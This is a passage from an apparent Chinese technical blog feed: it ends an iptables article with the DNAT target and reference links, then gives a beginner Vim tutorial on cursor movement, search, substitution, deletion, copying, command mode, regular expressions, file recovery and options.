<td style="text-align:left">这个target是用来做目的网络地址转换的，就是重写包的<strong>目的IP地址</strong>。如果一个包被匹配了，那么和它属于同一个流的所有的包都会被自动转换，然后就可以被路由到正确的主机或网络。<code>DNAT</code> target是非常有 用的。比如，你的Web服务器在LAN内部，而且没有可在Internet上使用的真实IP地址，那就可以使用这个target让防火墙把所有到它自己HTTP端口的包转发给LAN内部真正的Web服务器。目的地址也可以是一个范 围，这样的话，<code>DNAT</code>会为每一个流随机分配一个地址。因此，我们可以用这个target做某种类型地负载平 衡。注意，<strong><code>DANT</code> target只能用在nat表的<code>PREROUTING</code>和<code>OUTPUT</code>链中，或者是被这两条链调用的链里</strong>。但还要 注意的是，<strong>包含DANT target的链不能被除此之外的其他链调用，如<code>POSTROUTING</code></strong></td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>NOTE:</strong><br>每一个 TARGET 会有一些参数供防火墙在较细粒度下对数据包进行操作，详细信息参考：<br><a href="https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html#TARGETS" target="_blank" rel="external">https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html#TARGETS</a></p>
</blockquote>
<h2 id="6-参考资料"><a href="#6-参考资料" class="headerlink" title="6. 参考资料"></a>6. 参考资料</h2><ol>
<li><a href="http://www.ibm.com/developerworks/cn/linux/network/s-netip/" target="_blank" rel="external">netfilter/iptables 简介</a></li>
<li><a href="https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html" target="_blank" rel="external">Iptables Tutorial 1.2.2</a></li>
<li><a href="https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html" target="_blank" rel="external">iptables 指南 1.1.19</a></li>
<li><a href="http://drops.wooyun.org/tips/1424" target="_blank" rel="external">iptables入门教程</a></li>
<li><a href="http://wangcong.org/articles/learning-iptables.cn.html" target="_blank" rel="external">学习使用 iptables</a></li>
<li><a href="http://segmentfault.com/q/1010000002389520" target="_blank" rel="external">SNAT和DNAT的区别</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文尽量不涉及诸如iptables规则编写之类的技术细节，那些都是可以通过短暂的学习和实践掌握的。本文主要偏重在整体概念的介绍，和技术细节之外容易忽略却又很重要的点（比如过滤规则设计时需要遵从的一些“原则”），掌握不好这些点，编写一串过滤规则可能还是漏洞百出。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-简述&quot;&gt;&lt;a href=&quot;#1-简述&quot; class=&quot;headerlink&quot; title=&quot;1. 简述&quot;&gt;&lt;/a&gt;1. 简述&lt;/h2&gt;&lt;h3 id=&quot;1-1-Netfilter-iptables-介绍&quot;&gt;&lt;a href=&quot;#1-1-Netfilter-iptables-介绍&quot; class=&quot;headerlink&quot; title=&quot;1.1 Netfilter/iptables 介绍&quot;&gt;&lt;/a&gt;1.1 Netfilter/iptables 介绍&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;防火墙系统根据其工作方式的不同，主要可以分为 &lt;strong&gt;包过滤防火墙&lt;/strong&gt;(也称“网络层防火墙”) 和 &lt;strong&gt;应用层防火墙&lt;/strong&gt; ，&lt;code&gt;netfilter/iptables&lt;/code&gt; 包过滤系统是包过滤防火墙的代表。&lt;/p&gt;
&lt;p&gt;网络流量由 IP 信息包（或，简称 &lt;em&gt;信息包&lt;/em&gt;）— 以流的形式从源系统传输到目的地系统的一些小块数据 — 组成。 这些信息包有 &lt;strong&gt;头&lt;/strong&gt; ，即在每个包前面所附带的一些数据位，它们包含有关信息包的源、目的地和协议类型的信息。 防火墙根据一组规则检查这些头，以确定接受哪个信息包以及拒绝哪个信息包。该过程即为&lt;strong&gt;信息包过滤&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="system" scheme="http://jiayu0x.com/categories/system/"/>
    
    
      <category term="linux" scheme="http://jiayu0x.com/tags/linux/"/>
    
      <category term="iptables" scheme="http://jiayu0x.com/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>Vim 入门教程</title>
    <link href="http://jiayu0x.com/2014/07/22/vim-tutorial/"/>
    <id>http://jiayu0x.com/2014/07/22/vim-tutorial/</id>
    <published>2014-07-21T16:00:00.000Z</published>
    <updated>2017-04-03T15:57:57.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://images.cnitblog.com/blog/379772/201306/14142737-eaf681b3f8d04c5085d0c6efdd85684f.jpg" alt=""><br>图片来自： <a href="http://www.cnblogs.com/zhangsf/archive/2013/06/13/3134409.html" target="_blank" rel="external">http://www.cnblogs.com/zhangsf/archive/2013/06/13/3134409.html</a></p>
<blockquote>
<p>公司新员工学习有用到，Vim官网的手册又太大而全，而网上各方资料要么不全面，要么不够基础。在网上搜集各方资料，按照自己的框架整理一份Vim入门基础教程，分享出来。特点是偏向基础，但对入门者来说足够全面，而且结构框架清晰。<br>另外，参考资料众多，没有一一标出来，如果作者看到，请联系我确认一下是否参考了你的资料，我会在文中标注出来。</p>
</blockquote>
<a id="more"></a>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>Vim（Vi[Improved]）编辑器是功能强大的跨平台文本文件编辑工具，继承自Unix系统的Vi编辑器，支持Linux/Mac OS X/Windows系统，利用它可以建立、修改文本文件。进入Vim编辑程序，可以在终端输入下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$vim [filename]</div></pre></td></tr></table></figure></p>
<p>其中 <code>filename</code> 是要编辑器的文件的路径名。如果文件不存在，它将为你建立一个新文件。Vim编辑程序有三种操作模式，分别称为 <strong>编辑模式</strong>、<strong>插入模式</strong> 和 <strong>命令模式</strong>，当运行Vim时，首先进入编辑模式。</p>
<h2 id="2-编辑模式"><a href="#2-编辑模式" class="headerlink" title="2. 编辑模式"></a>2. 编辑模式</h2><p>Vim编辑方式的主要用途是在被编辑的文件中移动光标的位置。一旦光标移到到所要的位置，就可以进行剪切和粘贴正文块，删除正文和插入新的正文。当完成所有的编辑工作后，需要保存编辑器结果，退出编辑程序回到终端，可以发出<code>ZZ</code>命令，连续按两次大写的<code>Z</code>键。</p>
<h3 id="2-1-跳转"><a href="#2-1-跳转" class="headerlink" title="2.1 跳转"></a>2.1 跳转</h3><p>如果键盘上有上、下、左、右箭头的导航键，就由这些键来完成光标的移动。另外，可以用下面的键完成同样的 <strong>按字符移动</strong> 功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">k		上移；</div><div class="line">j		下移；</div><div class="line">h		左移；</div><div class="line">l		右移。</div></pre></td></tr></table></figure></p>
<p>上面这４个键将光标位置每次移动一行或一个 <strong>字符</strong> 。Vim还提供稍大范围移动光标的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ctrl+f		在文件中前移一页（相当于 page down）；</div><div class="line">ctrl+b		在文件中后移一页（相当于 page up）；</div></pre></td></tr></table></figure></p>
<p>更大范围的移动：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">*		  当光标停留在一个单词上，* 键会在文件内搜索该单词，并跳转到下一处；</div><div class="line">#		  当光标停留在一个单词上，# 在文件内搜索该单词，并跳转到上一处；</div><div class="line">(/)		  移动到 前/后 句 的开始；</div><div class="line">&#123;/&#125;		  跳转到 当前/下一个 段落 的开始;</div><div class="line">g_ 		  到本行最后一个不是 blank 字符的位置;</div><div class="line">fa 		  到下一个为 a 的字符处，你也可以 fs 到下一个为 s 的字符;</div><div class="line">t, 		  到逗号前的第一个字符，逗号可以变成其它字符；</div><div class="line">3fa               在当前行查找第三个出现的 a；</div><div class="line">F/T 	          和 f 和 t 一样，只不过是相反方向;</div><div class="line">gg		  将光标定位到文件第一行起始位置；</div><div class="line">G		  将光标定位到文件最后一行起始位置；</div><div class="line">NG或Ngg	          将光标定位到第 N 行的起始位置。</div></pre></td></tr></table></figure></p>
<p>在屏幕中找到需要的 <strong>一页</strong> 时，可以用下面的命令快速移动光标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">H		将光标移到屏幕上的起始行（或最上行）；</div><div class="line">M		将光标移到屏幕中间；</div><div class="line">L		将光标移到屏幕最后一行。</div></pre></td></tr></table></figure></p>
<p>同样需要注意字母的大小写。<code>H</code> 和 <code>L</code> 命令还可以加数字。如 <code>2H</code> 表示将光标移到屏幕的第２行，<code>3L</code> 表示将光标移到屏幕的倒数第3行。</p>
<p>当将光标移到所要的行是，<strong>行内移动</strong> 光标可以用下面的命令来实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">w		右移光标到下一个字的开头；</div><div class="line">e		右移光标到一个字的末尾；</div><div class="line">b		左移光标到前一个字的开头；</div><div class="line">0		数字０，左移光标到本行的开始；</div><div class="line">$		右移光标，到本行的末尾；</div><div class="line">^		移动光标，到本行的第一个非空字符。</div></pre></td></tr></table></figure></p>
<h3 id="2-2-搜索匹配"><a href="#2-2-搜索匹配" class="headerlink" title="2.2 搜索匹配"></a>2.2 搜索匹配</h3><p>和许多先进的编辑器一样，Vim 提供了强大的字符串搜索功能。要查找文件中指定字或短语出现的位置，可以用Vim直接进行搜索，而不必以手工方式进行。搜索方法是：键入字符 <code>/</code> ，后面跟以要搜索的字符串，然后按回车键。编辑程序执行正向搜索（即朝文件末尾方向），并在找到指定字符串后，将光标停到该字符串的开头；键入 <code>n</code> 命令可以继续执行搜索，找出这一字符串下次出现的位置。用字符 <code>?</code> 取代 <code>/</code> ，可以实现反向搜索（朝文件开头方向）。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/str1				正向搜索字符串 str1；</div><div class="line">n				继续搜索，找出 str1 字符串下次出现的位置；</div><div class="line">N				继续搜索，找出 str1 字符串上一次出现的位置；</div><div class="line">?str2				反向搜索字符串 str2 。</div></pre></td></tr></table></figure></p>
<p>无论搜索方向如何，当到达文件末尾或开头时，搜索工作会循环到文件的另一端并继续执行。</p>
<p>Vim中执行搜索匹配最强大的地方是结合 <strong>正则表达式</strong> 来搜索，后续将会介绍。</p>
<h3 id="2-3-替换和删除"><a href="#2-3-替换和删除" class="headerlink" title="2.3 替换和删除"></a>2.3 替换和删除</h3><p>Vim常规的删除命令是 <code>d</code>、 <code>x</code> (前者删除 <code>行</code> ，后者删除 <code>字符</code> ),结合Vim的其他特性可以实现基础的删除功能。将光标定位于文件内指定位置后，可以用其他字符来替换光标所指向的字符，或从当前光标位置删除一个或多个字符或一行、多行。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">rc				用 c 替换光标所指向的当前字符；</div><div class="line">nrc				用 c 替换光标所指向的前 n 个字符；</div><div class="line">5rA				用 A 替换光标所指向的前 5 个字符；</div><div class="line">x				删除光标所指向的当前字符；</div><div class="line">nx				删除光标所指向的前 n 个字符；</div><div class="line">3x			        删除光标所指向的前 3 个字符；</div><div class="line">dw				删除光标右侧的字；</div><div class="line">ndw				删除光标右侧的 n 个字；</div><div class="line">3dw				删除光标右侧的 3 个字；</div><div class="line">db				删除光标左侧的字；</div><div class="line">ndb				删除光标左侧的 n 个字；</div><div class="line">5db				删除光标左侧的 5 个字；</div><div class="line">dd				删除光标所在行，并去除空隙；</div><div class="line">ndd				删除（剪切） n 行内容，并去除空隙；</div><div class="line">3dd				删除（剪切） 3 行内容，并去除空隙；</div></pre></td></tr></table></figure></p>
<p>其他常用的删除命令有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">d$				从当前光标起删除字符直到行的结束；</div><div class="line">d0				从当前光标起删除字符直到行的开始；</div><div class="line">J				删除本行的回车符（CR），并和下一行合并。</div></pre></td></tr></table></figure></p>
<p>Vim常规的替换命令有 <code>c</code> 和 <code>s</code> ，结合Vim的其他特性可以实现基础的替换功能，不过替换命令执行以后，通常会由 <strong>编辑模式</strong> 进入 <strong>插入模式</strong> ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">s               用输入的正文替换光标所指向的字符；</div><div class="line">S               删除当前行，并进入编辑模式；</div><div class="line">ns              用输入的正文替换光标右侧 n 个字符；</div><div class="line">nS              删除当前行在内的 n 行，并进入编辑模式；</div><div class="line">cw              用输入的正文替换光标右侧的字；</div><div class="line">cW              用输入的正文替换从光标到行尾的所有字符（同 c$ )；</div><div class="line">ncw             用输入的正文替换光标右侧的 n 个字；</div><div class="line">cb              用输入的正文替换光标左侧的字；</div><div class="line">ncb             用输入的正文替换光标左侧的 n 个字；</div><div class="line">cd              用输入的正文替换光标的所在行；</div><div class="line">ncd             用输入的正文替换光标下面的 n 行；</div><div class="line">c$              用输入的正文替换从光标开始到本行末尾的所有字符；</div><div class="line">c0              用输入的正文替换从本行开头到光标的所有字符。</div></pre></td></tr></table></figure></p>
<h3 id="2-4-复制粘贴"><a href="#2-4-复制粘贴" class="headerlink" title="2.4 复制粘贴"></a>2.4 复制粘贴</h3><p>从正文中删除的内容（如字符、字或行）并没有真正丢失，而是被剪切并复制到了一个内存缓冲区中。用户可将其粘贴到正文中的指定位置。完成这一操作的命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p               小写字母 p，将缓冲区的内容粘贴到光标的后面；</div><div class="line">P               大写字母 P，将缓冲区的内容粘贴到光标的前面。</div></pre></td></tr></table></figure></p>
<p>如果缓冲区的内容是字符或字，直接粘贴在光标的前面或后面；如果缓冲区的内容为整行正文，执行上述粘贴命令将会粘贴在当前光标所在行的上一行或下一行。</p>
<p>注意上述两个命令中字母的大小写。Vim 编辑器经常以一对大、小写字母（如 <code>p</code> 和 <code>P</code>）来提供一对相似的功能。通常，小写命令在光标的后面进行操作，大写命令在光标的前面进行操作。</p>
<p>有时需要复制一段正文到新位置，同时保留原有位置的内容。这种情况下，首先应当把指定内容复制（而不是剪切）到内存缓冲区。完成这一操作的命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yy              复制当前行到内存缓冲区；</div><div class="line">nyy             复制 n 行内容到内存缓冲区；</div><div class="line">5yy             复制 5 行内容到内存缓冲区；</div><div class="line">“+y             复制 1 行到操作系统的粘贴板；</div><div class="line">“+nyy           复制 n 行到操作系统的粘贴板。</div></pre></td></tr></table></figure></p>
<h3 id="2-5-撤销和重复"><a href="#2-5-撤销和重复" class="headerlink" title="2.5 撤销和重复"></a>2.5 撤销和重复</h3><p>在编辑文档的过程中，为消除某个错误的编辑命令造成的后果，可以用撤消命令。另外，如果用户希望在新的光标位置重复前面执行过的编辑命令，可用重复命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">u               撤消前一条命令的结果；</div><div class="line">.               重复最后一条修改正文的命令。</div></pre></td></tr></table></figure></p>
<h2 id="3-插入模式"><a href="#3-插入模式" class="headerlink" title="3. 插入模式"></a>3. 插入模式</h2><h3 id="3-1-进入插入模式"><a href="#3-1-进入插入模式" class="headerlink" title="3.1 进入插入模式"></a>3.1 进入插入模式</h3><p>在编辑模式下正确定位光标之后，可用以下命令切换到插入模式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">i           在光标左侧插入正文</div><div class="line">a           在光标右侧插入正文</div><div class="line">o           在光标所在行的下一行增添新行</div><div class="line">O           在光标所在行的上一行增添新行</div><div class="line">I           在光标所在行的开头插入</div><div class="line">A           在光标所在行的末尾插入</div></pre></td></tr></table></figure></p>
<h3 id="3-2-退出插入模式"><a href="#3-2-退出插入模式" class="headerlink" title="3.2 退出插入模式"></a>3.2 退出插入模式</h3><p>退出插入模式的方法是，按 <code>ESC</code> 键或组合键 <code>Ctrl+[</code> ，退出插入模式之后，将会进入编辑模式 。</p>
<h2 id="4-命令模式"><a href="#4-命令模式" class="headerlink" title="4. 命令模式"></a>4. 命令模式</h2><p>在Vim的命令模式下，可以使用复杂的命令。在编辑模式下键入 <code>:</code> ，光标就跳到屏幕最后一行，并在那里显示冒号，此时已进入命令模式。命令模式又称 <strong>末行模式</strong> ，用户输入的内容均显示在屏幕的最后一行，按回车键，Vim 执行命令。</p>
<h3 id="4-1-打开、保存、退出"><a href="#4-1-打开、保存、退出" class="headerlink" title="4.1 打开、保存、退出"></a>4.1 打开、保存、退出</h3><p>在已经启动的Vim中打开一个文件需要用 <strong><code>:e</code></strong> 命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:e path_to_file/filename</div></pre></td></tr></table></figure></p>
<p>保存当前编辑的文件需要用 <strong><code>:w</code></strong> 命令（单词 <code>write</code> 的缩写）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:w</div></pre></td></tr></table></figure></p>
<p>将当前文件另存为 <code>file_temp</code> 则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:w file_temp</div></pre></td></tr></table></figure></p>
<p>在编辑模式下可以用 <code>ZZ</code> 命令退出Vim编辑程序，该命令保存对正文所作的修改，覆盖原始文件。如果只需要退出编辑程序，而不打算保存编辑的内容，可用下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">: q				在未作修改的情况下退出；</div><div class="line">: q!			   放弃所有修改，退出编辑程序。</div></pre></td></tr></table></figure></p>
<p>保存并退出则可以讲两条命令结合起来使用（注意命令顺序，先保存，后退出）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:wq</div></pre></td></tr></table></figure></p>
<h3 id="4-2-行号与文件"><a href="#4-2-行号与文件" class="headerlink" title="4.2 行号与文件"></a>4.2 行号与文件</h3><p>编辑中的每一行正文都有自己的行号，用下列命令可以移动光标到指定行（效果与 <strong>编辑模式</strong> 下的 <code>ngg</code> 或 <code>nG</code> 相同）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">: n             将光标移到第 n 行</div></pre></td></tr></table></figure></p>
<p>命令模式下，可以规定命令操作的行号范围。数值用来指定绝对行号；字符“.”表示光标所在行的行号；字符符“$”表示正文最后一行的行号；简单的表达式，例如“.+5”表示当前行往下的第 5 行。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">:345				  将光标移到第 345 行</div><div class="line">:345w file			将第 345 行写入 file 文件</div><div class="line">:3,5w file			将第 3 行至第 5 行写入 file 文件</div><div class="line">:1,.w file			将第 1 行至当前行写入 file 文件</div><div class="line">:.,$w file			将当前行至最后一行写入 file 文件</div><div class="line">:.,.+5w file		  从当前行开始将 6 行内容写入 file 文件</div><div class="line">:1,$w file			将所有内容写入 file 文件，相当于 :w file 命令</div></pre></td></tr></table></figure></p>
<p>在命令模式下，允许从文件中读取正文，或将正文写入文件。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">:w                 将编辑的内容写入原始文件，用来保存编辑的中间结果</div><div class="line">:wq				将编辑的内容写入原始文件并退出编辑程序（相当于 ZZ 命令）</div><div class="line">:w file			将编辑的内容写入 file 文件，保持原有文件的内容不变</div><div class="line">:a,bw file		 将第 a 行至第 b 行的内容写入 file 文件</div><div class="line">:r file			读取 file 文件的内容，插入当前光标所在行的后面</div><div class="line">:e file			编辑新文件 file 代替原有内容</div><div class="line">:f file			将当前文件重命名为 file</div><div class="line">:f				 打印当前文件名称和状态，如文件的行数、光标所在的行号等</div></pre></td></tr></table></figure></p>
<h3 id="4-3-字符串搜索"><a href="#4-3-字符串搜索" class="headerlink" title="4.3 字符串搜索"></a>4.3 字符串搜索</h3><p>在 <strong>编辑模式</strong> 讲过字符串的搜索，此处的 <strong>命令模式</strong> 也可以进行字符串搜索，给出一个字符串，可以通过搜索该字符串到达指定行。如果希望进行正向搜索，将待搜索的字符串置于两个 <code>/</code> 之间；如果希望反向搜索，则将字符串放在两个 <code>?</code> 之间。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">:/str/				  正向搜索，将光标移到下一个包含字符串 str 的行</div><div class="line">:?str?			      反向搜索，将光标移到上一个包含字符串 str 的行</div><div class="line">:/str/w file		    正向搜索，并将第一个包含字符串 str 的行写入 file 文件</div><div class="line">:/str1/,/str2/w file	正向搜索，并将包含字符串 str1 的行至包含字符串 str2 的行写</div></pre></td></tr></table></figure></p>
<h3 id="4-4-Vim中的正则表达式"><a href="#4-4-Vim中的正则表达式" class="headerlink" title="4.4 Vim中的正则表达式"></a>4.4 Vim中的正则表达式</h3><p>当给Vim指定搜索字符串时，可以包含具有特殊含义的字符。包含这些特殊字符的搜索字符串称为正则表达式（Regular Expressions）。例如，要搜索一行正文，这行正文的开头包含 <code>struct</code> 字。下面的命令做不到这一点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:/struct/</div></pre></td></tr></table></figure></p>
<p>因为它只找出在行中任意位置包含 <code>struct</code>的第一行，并不一定在行的开始包含 <code>struct</code> 。解决问题的办法是在搜索字符串前面加上特殊字符^：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:/^struct/</div></pre></td></tr></table></figure></p>
<p><code>^</code> 字符比较每行开头的字符串。所以上面的命令表示：找出以字符串 <code>struct</code> 开头的行。<br>也可以用类似办法在搜索字符串后面加上表示行的末尾的特殊字符 <code>$</code> 来找出位于行末尾的字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:/^struct/</div></pre></td></tr></table></figure></p>
<p>下表给出大多数特殊字符和它们的含义：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">^				放在字符串前面，匹配行首的字；</div><div class="line">$				放在字符串后面，匹配行尾的字；</div><div class="line">\&lt;			   匹配一个字的字头；</div><div class="line">\&gt;			   匹配一个字的字尾；</div><div class="line">.				匹配任何单个正文字符；</div><div class="line">[str]			匹配 str 中的任何单个字符；</div><div class="line">[^str]		   匹配任何不在 str 中的单个字符；</div><div class="line">[a-b]			匹配 a 到 b 之间的任一字符；</div><div class="line">*				匹配前一个字符的 0 次或多次出现；</div><div class="line">\				转义后面的字符。</div></pre></td></tr></table></figure></p>
<p>简单介绍这么多，正则表达式知识可以参考<br>《正则表达式30分钟入门》:<a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="external">http://deerchao.net/tutorials/regex/regex.htm</a><br>另外，进阶的Vim正则表达式还有对Magic 模式的介绍，可以参考<br>《Vim正则表达式详解》:<br><a href="http://blog.csdn.net/salc3k/article/details/8222397" target="_blank" rel="external">http://blog.csdn.net/salc3k/article/details/8222397</a></p>
<h3 id="4-5-正文替换"><a href="#4-5-正文替换" class="headerlink" title="4.5 正文替换"></a>4.5 正文替换</h3><p>利用 <code>:s</code> 命令可以实现字符串的替换。具体的用法包括：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">:%s/str1/str2/		用字符串 str2 替换行中首次出现的字符串 str1</div><div class="line">:s/str1/str2/g		用字符串 str2 替换行中所有出现的字符串 str1</div><div class="line">:.,$ s/str1/str2/g	用字符串 str2 替换正文当前行到末尾所有出现的字符串 str1</div><div class="line">:1,$ s/str1/str2/g	用字符串 str2 替换正文中所有出现的字符串 str1</div><div class="line">:g/str1/s//str2/g	 功能同上</div><div class="line">:m,ns/str1/str2/g	 将从m行到n行的str1替换成str2</div></pre></td></tr></table></figure></p>
<p>从上述替换命令可以看到：</p>
<ol>
<li><code>g</code> 放在命令末尾，表示对搜索字符串的每次出现进行替换,不止匹配每行中的第一次出现；不加 <code>g</code>，表示只对搜索字符串的首次出现进行替换；<code>g</code> 放在命令开头，表示对正文中所有包含搜索字符串的行进行替换操作;</li>
<li><code>s</code> 表示后面跟着一串替换的命令；</li>
<li><code>%</code> 表示替换范围是所有行，即全文。</li>
</ol>
<p>另外一个实用的命令，在Vim中统计当前文件中字符串 <code>str1</code> 出现的次数，可用替换命令的变形：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:%s/str1/&amp;/gn</div></pre></td></tr></table></figure></p>
<h3 id="4-6-删除正文"><a href="#4-6-删除正文" class="headerlink" title="4.6 删除正文"></a>4.6 删除正文</h3><p>在命令模式下，同样可以删除正文中的内容。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">:d				              删除光标所在行</div><div class="line">:3d				             删除 3 行</div><div class="line">:.,$d				           删除当前行至正文的末尾</div><div class="line">:/str1/,/str2/d		         删除从字符串 str1 到 str2 的所有行</div><div class="line">:g/^\(.*\)$\n\1$/d              删除连续相同的行，保留最后一行</div><div class="line">:g/\%(^\1$\n\)\@&lt;=\(.*\)$/d     删除连续相同的行，保留最开始一行</div><div class="line">:g/^\s*$\n\s*$/d                删除连续多个空行，只保留一行空行</div><div class="line">:5,20s/^#//g                    删除5到20行开头的 # 注释</div></pre></td></tr></table></figure></p>
<p>总之，Vim的初级删除命令是用 <code>d</code> ，高级删除命令可以用 <strong>正则替换</strong> 的方式执行。</p>
<h3 id="4-7-恢复文件"><a href="#4-7-恢复文件" class="headerlink" title="4.7 恢复文件"></a>4.7 恢复文件</h3><p>Vim 在编辑某个文件时，会另外生成一个临时文件，这个文件的名称通常以 <code>.</code> 开头，并以 <code>.swp</code> 结尾。Vim 在正常退出时，该文件被删除，若意外退出，而没有保存文件的最新修改内容，则可以使用恢复命令 <code>:recover</code> 来恢复文件，也可以在启动Vim时用 <code>-r</code> 选项。</p>
<h3 id="4-8-选项设置"><a href="#4-8-选项设置" class="headerlink" title="4.8 选项设置"></a>4.8 选项设置</h3><p>为控制不同的编辑功能，Vim 提供了很多内部选项。利用 <code>:set</code> 命令可以设置选项。基本语法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set option         设置选项 option</div></pre></td></tr></table></figure></p>
<p>常见的功能选项包括：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">autoindent		设置该选项，则正文自动缩进</div><div class="line">ignorecase		设置该选项，则忽略规则表达式中大小写字母的区别</div><div class="line">number			设置该选项，则显示正文行号</div><div class="line">ruler			 设置该选项，则在屏幕底部显示光标所在行、列的位置</div><div class="line">tabstop		   设置按 Tab 键跳过的空格数。例如 :set tabstop=n，n 默认值为 8</div><div class="line">mk				将选项保存在当前目录的 .exrc 文件中</div></pre></td></tr></table></figure></p>
